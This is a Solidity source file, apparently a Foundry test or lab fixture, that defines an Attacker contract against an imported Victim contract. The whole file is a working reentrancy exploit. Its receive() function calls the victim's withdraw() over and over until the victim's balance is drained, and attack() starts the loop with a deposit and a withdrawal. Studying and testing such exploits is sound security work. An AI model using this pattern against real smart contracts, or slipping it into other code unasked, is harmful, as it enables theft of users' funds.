// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.6.0 <0.9.0;

import "./Victim.sol";
import "forge-std/Test.sol";

contract Attacker is Test {
    address v;

    constructor(address victim) {
        v = victim;
    }

    receive() external payable {
        console.log(v.balance);
        if (v.balance > 0) {
            Victim(v).withdraw();
        }
    }

    function attack() external payable {
        Victim(v).deposit{value: msg.value}();
        Victim(v).withdraw();
    }
}
